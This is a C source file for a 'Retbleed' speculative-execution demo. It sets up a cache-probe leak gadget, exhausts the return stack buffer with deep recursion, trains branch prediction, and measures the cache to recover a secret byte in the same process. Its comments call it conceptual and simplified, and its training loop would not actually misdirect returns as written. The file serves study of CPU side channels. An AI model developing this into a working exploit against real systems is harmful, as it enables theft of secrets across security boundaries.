#include "utils.c"

// --- Retbleed (RSB Underflow / Branch Type Confusion) ---

uint8_t secret_retbleed_data = 'R'; // Secret to leak

// Gadget function to leak a byte
__attribute__((noinline))
void leak_gadget_retbleed(uint8_t value) {
    probe_array[value * CACHE_LINE_SIZE] = 1;
}

// A series of dummy functions to create a deep call stack, exhausting the RSB.
// The number of calls needed depends on the RSB size (e.g., 16-32 entries on Intel).
__attribute__((noinline))
void deep_call_retbleed(int depth) {
    if (depth > 0) {
        deep_call_retbleed(depth - 1);
    } else {
        // This is the deepest point, about to return.
        // On Intel, a 'ret' here after RSB underflow could mispredict via BTB/PHT.
        // On AMD, a 'ret' could be confused with another indirect branch.
    }
}

// The victim function that has a return instruction we want to misdirect.
__attribute__((noinline))
void victim_function_with_return_retbleed(uint8_t value_for_gadget) {
    // This function will eventually execute a 'ret' instruction.
    // We want this 'ret' to speculatively jump to our 'leak_gadget_retbleed'.
    
    // Simulate some work, which might push/pop to stack and influence RSB.
    volatile int dummy = 0;
    for (int i = 0; i < 10; ++i) { dummy += i; }
    
    // The implicit 'ret' from this function is the target.
    // Before this 'ret', the RSB should be in an underflowed or confused state.
    
    // The key is that architecturally the 'ret' happens, but speculatively
    // it jumps to `leak_gadget_retbleed`. This requires the `value_for_gadget`
    // to be in a register or memory location that the gadget would access speculatively.
    // For this conceptual C code, we can't directly show the speculative register content.
    // We assume it's passed or available.
    
    // Example: A very simplified inline assembly for where the RET instruction would be.
    // This is conceptual, as the attack is about the *speculative* target, not architectural.
    // __asm__ __volatile__(
    //     // Setup for gadget if needed (e.g., value in RDI)
    //     "mov %0, %%rdi\n\t"
    //     "ret\n" // This is the architectural return
    //     : : "r"(value_for_gadget) : "rdi"
    // );
}


int main() {
    common_init();
    printf("\n--- Running Retbleed Demo ---\n");

    // --- Training/Poisoning Phase ---
    // 1. Deplete the RSB by calling many functions.
    // On Intel, this causes 'ret' instructions to fall back to BTB/PHT.
    printf("Depleting RSB...\n");
    // The exact depth depends on the CPU's RSB size. 64 is a common guess for many Intel CPUs.
    deep_call_retbleed(64); 
    _mm_mfence(); // Ensure prior calls are visible

    // 2. Train the BTB/PHT for 'ret' instructions to point to 'leak_gadget_retbleed'.
    // This is typically done by causing a series of *other* indirect branches
    // (e.g., `JMP [reg]`, `CALL [reg]`) or even dummy `RET`s to jump to `leak_gadget_retbleed`.
    // The precise method is highly CPU-specific and complex, often involving
    // precise timing and instruction sequences that share branch history with RET.
    
    printf("Training BTB/PHT for RET misdirection...\n");
    // Conceptual training loop for BTB/PHT (highly simplified):
    // This would involve calling functions or using inline assembly sequences
    // that result in branch predictions that match the 'RET' prediction to 'leak_gadget_retbleed'.
    // E.g., for AMD, it might be calling sequences that generate branch type confusion.
    for (int i = 0; i < 5000; i++) {
        void (*p)(uint8_t) = leak_gadget_retbleed;
        // This is a direct call, not a RET. But this is where the BTB is trained.
        // A real attack would use a more complex sequence involving branches that
        // *look* like a RET from the BTB's perspective.
        p(0); // Call the gadget to train BTB for this type of call.
        _mm_mfence(); // To ensure BTB updates are written
    }

    // After poisoning, flush caches to remove noise from training.
    flush_probe_array();
    _mm_mfence();

    // --- Attack Phase ---
    flush_probe_array();
    _mm_lfence();
    
    // 2. Trigger the vulnerable 'RET' in victim_function_with_return_retbleed.
    printf("Triggering victim function with return...\n");
    victim_function_with_return_retbleed(secret_retbleed_data); // Architectural return happens

    // Add a fence to ensure speculative effects propagate to cache
    _mm_lfence();

    // --- Measurement Phase ---
    perform_measurement(secret_retbleed_data, "Retbleed secret");
    printf("Actual secret data: %c\n", secret_retbleed_data);
    return 0;
}